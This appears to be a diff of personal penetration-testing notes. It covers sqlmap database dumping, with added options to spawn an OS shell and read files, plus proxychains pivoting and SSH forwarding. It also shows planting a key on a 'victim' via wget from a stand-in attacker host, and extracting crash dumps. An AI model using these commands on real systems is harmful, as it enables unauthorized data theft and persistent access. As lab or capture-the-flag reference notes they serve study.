@@ -38,7 +38,7 @@
 1. `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "id=1" --dbs`
 2. `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "id=1" -D <database> --tables`
 3. `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "id=1" -D <database> -T <table> --dump`
-4. 3. `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "id=1" -D <database> -T <table> -C <column> --dump`
+4. `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "id=1" -D <database> -T <table> -C <column> --dump`
 
 `--flush-session` to start again
 
@@ -52,6 +52,10 @@
 
 `--union-cols=n` to manually specify number of union columns 
 
+`--os-shell --technique=E` to spawn a shell
+
+`--file-read` to read files
+
 Proxy chains
 ---
 ```
@@ -64,8 +68,16 @@ socks5 <victim service> <victim port> <user> <password>
 $ proxychains ssh user@<ip>
 ```
 
-SSH port forwarding
+Other web stuff
 ---
+- Check SSL cert
+- Check email domains
+- Check 404 pages
+- Try both `/tmp` and `/dev/shm` for file writes
+
+# Local Attacks
+
+## SSH port forwarding
 
 append your pub key to `/home/user/.ssh/authorized_keys`
 
@@ -78,8 +90,7 @@ OR using dynamic forwarding for attacks
 `ssh -D <local port> <victim>@<ip>`
 
 
-Adding your SSH to the victim
----
+## Adding your SSH to the victim
 
 Append your public to the victim's ~/.ssh/authorized_keys
 
@@ -92,8 +103,7 @@ wget http://attacker/id_rsa.pub
 cat id_rsa.pub >> ~/.ssh/authorized_keys
 ```
 
-Getting Crash Data
----
+## Getting Crash Data
 
 While program is running, kill it with
 
@@ -106,9 +116,3 @@ apport-unpack /var/crash/_opt_count.1000.crash /tmp/crashed
 strings /tmp/crashed/CoreDump
 ```
 
-Other stuff
----
-- Check SSL cert
-- Check email domains
-- Check 404 pages
-- Try both `/tmp` and `/dev/shm` for file writes
